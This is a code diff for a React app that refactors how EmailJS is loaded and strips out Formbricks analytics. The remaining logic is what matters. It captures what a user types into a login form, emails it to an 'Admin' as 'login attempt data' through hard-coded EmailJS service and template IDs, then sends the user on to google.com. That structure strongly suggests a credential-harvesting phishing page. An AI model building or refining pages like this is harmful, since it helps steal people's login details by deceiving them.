@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import emailjs from '@emailjs/browser';
 
 export default function App() {
   const [email, setEmail] = useState('');
@@ -8,46 +9,8 @@ export default function App() {
   const [showSuccessScreen, setShowSuccessScreen] = useState(false);
 
   useEffect(() => {
-    // Load EmailJS script
-    const script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-    script.onload = () => {
-      // Initialize EmailJS with your public key
-      window.emailjs.init("DCnFHeeyL6GEWE6J2");
-    };
-    document.head.appendChild(script);
-
-    // Initialize Formbricks
-    const initFormbricks = () => {
-      const appUrl = "https://app.formbricks.com";
-      const environmentId = "cmffix8ko2828x901hlai76qm";
-      
-      if (window.formbricks) return;
-      
-      const formbricksScript = document.createElement("script");
-      formbricksScript.type = "text/javascript";
-      formbricksScript.async = true;
-      formbricksScript.src = appUrl + "/js/formbricks.umd.cjs";
-      formbricksScript.onload = function() {
-        if (window.formbricks) {
-          window.formbricks.setup({
-            environmentId: environmentId,
-            apiHost: appUrl,
-            debug: false
-          });
-        } else {
-          console.error("Formbricks library failed to load properly.");
-        }
-      };
-      
-      document.head.appendChild(formbricksScript);
-    };
-
-    initFormbricks();
-
-    return () => {
-      document.head.removeChild(script);
-    };
+    // Load EmailJS
+    emailjs.init("DCnFHeeyL6GEWE6J2");
   }, []);
 
   const handleSubmit = async (e) => {
@@ -56,7 +19,7 @@ export default function App() {
     setError('');
     
     try {
-      // Send data via EmailJS using your template
+      // Send data via EmailJS
       const templateParams = {
         from_name: email,
         to_name: "Admin",
@@ -73,20 +36,12 @@ This is an automated message with login attempt data.`,
         subject: `Login Attempt - ${email}`
       };
 
-      // Send the email with your specific IDs
-      const response = await window.emailjs.send(
+      // Send the email
+      const response = await emailjs.send(
         "service_wni6k0h", 
         "template_pf34tgf", 
         templateParams
       );
-      
-      // Track with Formbricks if available
-      if (window.formbricks) {
-        window.formbricks.track("login_attempt", {
-          email: email,
-          timestamp: new Date().toISOString()
-        });
-      }
       
       // Show success screen
       setShowSuccessScreen(true);
@@ -119,12 +74,6 @@ This is an automated message with login attempt data.`,
             {/* Continue Button - redirects to google.com */}
             <button
               onClick={() => {
-                // Track button click with Formbricks if available
-                if (window.formbricks) {
-                  window.formbricks.track("continue_to_google_clicked", {
-                    timestamp: new Date().toISOString()
-                  });
-                }
                 window.location.href = 'https://www.google.com';
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
